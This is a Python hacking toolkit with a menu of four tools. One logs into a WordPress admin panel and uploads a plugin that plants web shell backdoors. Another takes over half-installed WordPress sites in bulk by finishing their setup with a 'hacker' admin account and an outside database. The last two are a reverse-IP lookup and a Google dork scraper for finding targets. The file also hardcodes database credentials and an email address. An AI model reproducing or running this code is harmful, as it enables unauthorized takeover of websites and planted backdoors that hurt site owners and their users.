import requests
from bs4 import BeautifulSoup
import random
import urllib.parse
import urllib.request

def WP_Upload():
    print("""
    \033[32m
    ================================================================================
                  \033[34m   WP Ato Shell UP
    \033[32m
    
                (                                             
      (  (      )\ )               (            (             
      )\))(   '(()/(      (        )\        )  )\ )  (  (    
     ((_)()\ )  /(_))__   )\ `  ) ((_)(   ( /( (()/( ))\ )(   
     _(())\_)()(_))|___| ((_)/(/(  _  )\  )(_)) ((_))((_|()\  
     \ \((_)/ /| _ \  | | | ((_)_\| |((_)((_)_  _| (_))  ((_) 
      \ \/\/ / |  _/  | |_| | '_ \) / _ \/ _` / _` / -_)| '_| 
       \_/\_/  |_|     \___/| .__/|_\___/\__,_\__,_\___||_|   
                       |_|                               

    	  		    \033[35m Coded by LarryLinus \033[0m 
    ================================================================================
    \033[0m """)
    try:

        url = input('Enter your WP Domain:')
        user = input('Enter WP User Name:')
        passwd = input('Enter WP Passwd:')
        session = requests.session()
        response = session.post(url + '/wp-login.php',
                                data={'log': user, 'pwd': passwd, 'rememberme': 'forever', 'wp-submit': 'Log In',
                                      'redirect_to': url + '/wordpress/wp-admin/', 'testcookie': '1'})
        go_upload_page = session.post(url + '/wp-admin/plugin-install.php')
        get_html = go_upload_page.text
        soup = BeautifulSoup(get_html, 'lxml')
        match = soup.find('form', method='post')
        nonceline = match.find('input', id='_wpnonce')['value']
        upload_file = session.post(url + '/wp-admin/update.php?action=upload-plugin',
                                   files={'pluginzip': open('larry.zip', 'rb')},
                                   data={'_wpnonce': nonceline, '_wp_http_referer': '/wp-admin/plugin-install.php',
                                         'install-plugin-submit': 'Install Now'})
        print('=====================================================================')
        print('Upload Done!')
        print('Backdoor Link Given Below ')
        print('Uploader: ' + url + '/wp-content/plugins/larry/file.php')
        print('Mini Shell 1: ' + url + '/wp-content/plugins/larry/linus.php')
        print('Mini Shell 2: ' + url + '/wp-content/plugins/larry/mini.php')
        print('======================================================================')
    except Exception:
        print('Unable to Inject Backdoor')


def Install():
    print("""
    \033[32m
    ================================================================================
                  \033[34m   The WP Mass Installer
    \033[32m
    __        ______     _   _        _           _        _ _ 
    \ \      / |  _ \   / \ | |_ ___ (_)_ __  ___| |_ __ _| | |
     \ \ /\ / /| |_)   / _ \| __/ _ \| | '_ \/ __| __/ _` | | |
      \ V  V / |  __/ / ___ | || (_) | | | | \__ | || (_| | | |
       \_/\_/  |_|   /_/   \_\__\___/|_|_| |_|___/\__\__,_|_|_|
    	  		    \033[35m Coded by LarryLinus \033[0m 
    ================================================================================
    \033[0m """)

    urli = input('Enter List name with format:')
    arq = open(urli, "r")
    lines = arq.readlines()
    arq.close
    for url in lines:
        url = url.replace("\n", "")
        if url == 'exit':
            print('All Domain checked')
            exit()
        else:
            try:

                m = requests.post(str(url) + '/wp-admin/setup-config.php?step=1')
                n = m.text
                soup = BeautifulSoup(n, 'lxml')
                match = soup.a.text

                if match == 'installing now':

                    print(url + ' DB already configered !')
                    try:
                        l = requests.post(str(url) + '/wp-admin/install.php')
                        ls = l.text
                        soup2 = BeautifulSoup(ls, 'lxml')
                        match2 = soup2.h1.text

                        if match2 == 'Already Installed':
                            print('WP already indtalled')
                            print('=================')
                    except Exception:
                        requests.post(str(url) + "/wp-admin/install.php?step=2",
                                      data={'weblog_title': 'AtoExploited', 'user_name': 'hacker',
                                            'admin_password': 'Test@1234', 'pass1-text': 'Test@1234',
                                            'admin_password2': 'Test@1234', 'admin_email': 'mhshakib100@gmail.com',
                                            'Submit': 'Install WordPress', 'language': ''})
                        print('==================')
                        print(url + ' Install Done!')
                        print('User:hacker')
                        print('Pass:Test@1234')
                        print('==================')
                        w = open("success.txt", "a")
                        w.write(url + '\r')
                        w.close()


                else:
                    try:
                        print('Try to install ....')
                        gread1 = ['HH', 'A', 'CC', 'K', 'XX', 'P', 'LL', 'O', 'RR', 'E', 'TYT', 'RT', 'd', 'o', 'tT',
                                  'F', 'U', 'C', 'K', 'T', 'H', 'A', 'T']
                        gread2 = ['H', 'I', 'I', 'A', 'M', 'L', 'Aa', 'rr', 'r', 'y', 'L', 'i', 'n', 'u', 's', 'i',
                                  'AM', 'N', 'o', 't', 'V', 'e', 'rR', 'y']
                        file1 = random.choice(gread1)
                        file2 = random.choice(gread2)
                        DB = 'WP_' + file1 + file2
                        print('Try To creat DB...')
                        print('Installing....')
                        r = requests.post(str(url) + "/wp-admin/setup-config.php?step=2",
                                          data={'dbname': 'sql2266865', 'uname': 'sql2266865', 'pwd': 'mC6%aX3*',
                                                'dbhost': 'sql2.freemysqlhosting.net', 'prefix': DB, 'language': '',
                                                'submit': 'Submit'})
                        print('Iis need some time....')
                        g = requests.post(str(url) + "/wp-admin/install.php?step=2",
                                          data={'weblog_title': 'AtoExploited', 'user_name': 'hacker',
                                                'admin_password': 'Test@1234', 'pass1-text': 'Test@1234',
                                                'admin_password2': 'Test@1234', 'admin_email': 'mhshakib100@gmail.com',
                                                'Submit': 'Install WordPress', 'language': ''})
                        print('==================')
                        print(url + ' install Done!')
                        print('User:hacker')
                        print('Pass:Test@1234')
                        print('==================')
                        f = open("success.txt", "a")
                        f.write(url + '\r')
                        f.close()
                    except Exception:
                        print(url + ' Install not possible')
                        print('==================')
            except Exception:
                print(url + ' Install not possible')
                print('==================')


def Rivers_IP():
    print("""
    \033[32m
    ================================================================================================
                  \033[34m   Reverse IP
    \033[32m

      ____                              ___ ____  
     |  _ \ _____   _____ _ __ ___  ___|_ _|  _ \ 
     | |_) / _ \ \ / / _ | '__/ __|/ _  | || |_) |
     |  _ |  __/\ V |  __| |  \__ |  __ | ||  __/ 
     |_| \_\___| \_/ \___|_|  |___/\___|___|_|    

    	  		    \033[35m Coded by LarryLinus \033[0m 
    ================================================================================================
    \033[0m """)
    i = input('Enter an IP :')
    r = requests.post("https://hackertarget.com/reverse-ip-lookup/",
                      data={'theinput': i, 'thetest': 'reverseiplookup', 'name_of_nonce_field': '084e65f1f9',
                            '_wp_http_referer': '/reverse-ip-lookup/'})
    t = r.text
    soup = BeautifulSoup(t, 'lxml')
    match = soup.pre.text
    print(match)





def Dorker():
    print("""
    \033[32m
    ================================================================================
                         \033[34m   The GOOGLE DORK SCRAPER 
    \033[32m
     ____   ___  ____  _  _ ____   ____ ____     _    ____  _____ ____  
    |  _ \ / _ \|  _ \| |/ / ___| / ___|  _ \   / \  |  _ \| ____|  _ \ 
    | | | | | | | |_) | ' /\___ \| |   | |_) | / _ \ | |_) |  _| | |_) |
    | |_| | |_| |  _ <| . \ ___) | |___|  _ < / ___ \|  __/| |___|  _ < 
    |____/ \___/|_| \_|_|\_|____/ \____|_| \_/_/   \_|_|   |_____|_| \_\

    	  		\033[35m Coded by LarryLinus \033[0m 
    ================================================================================
    \033[0m """)

    url = input(str('Search me, I am Google:'))
    values = {'q': url}
    data = urllib.parse.urlencode(values)
    extra = str('&ei=xomrWqLjLcPQ0gS05o_gCA&start=')
    ix = 0
    z = int(input('How many pages do you want to scrape:'))
    while ix <= z - 1:
        url = 'https://www.google.com/search?' + data + extra + str(ix) + '0&sa=N'
        ix = ix + 1

        headers = {}
        headers['User-Agent'] = "Mozilla/5.0 (X11; Linux i686)"
        req = urllib.request.Request(url, headers=headers)

        resp = urllib.request.urlopen(req)

        resp_data = resp.read()
        soup = BeautifulSoup(resp_data, "lxml")
        clean = soup.prettify()
        gdata = soup.find_all('h3', {'class': 'r'})
        for link in gdata:
            word = link.find('a')
            m = word.get("href")
            print('www.google.com' + m)



print("""
    \033[34m
    ================================================================================================
    =                                    CODED BY LarryLinus                                       =                                                      
    =                                                                                              =
    =                   $$\      $$\           $$\      $$\           $$\                          =
    =                   $$$\    $$$ |          $$ | $\  $$ |          $$ |                         =
    =                   $$$$\  $$$$ | $$$$$$\  $$ |$$$\ $$ | $$$$$$\  $$$$$$$\                     =
    =                   $$\$$\$$ $$ |$$  __$$\ $$ $$ $$\$$ |$$  __$$\ $$  __$$\                    =
    =                   $$ \$$$  $$ |$$ |  \__|$$$$  _$$$$ |$$$$$$$$ |$$ |  $$ |                   =
    =                   $$ |\$  /$$ |$$ |      $$$  / \$$$ |$$   ____|$$ |  $$ |                   =
    =                   $$ | \_/ $$ |$$ |$$\   $$  /   \$$ |\$$$$$$$\ $$$$$$$  |                   =
    =                   \__|     \__|\__|\__|  \__/     \__| \_______|\_______/                    =
    =                                                                                              =
    ================================================================================================ 
   \033[32m ================================================================================================                                                             
    = **************************** Which Exploit DO You Want To Use********************************=                            
    = **************************** Enter 1 for Upload Shell in WP *********************************=                            
    = **************************** Enter 2 for WP Mass installer **********************************=                            
    = **************************** Enter 3 for Reverse IP Lookup **********************************=                            
    = **************************** Enter 4 for GOOGLE DORK SCRAPER ********************************=                            
    ================================================================================================\033[0m
    \033[0m """)
def start_exploit():

     inp = int(input('    Enter your Choise:'))
     if inp == 1:
         WP_Upload()
     elif inp == 2:
         Install()

     elif inp == 3:
         Rivers_IP()
     elif inp == 4:
         Dorker()
     else:
         print('Type Right Input')

start_exploit()
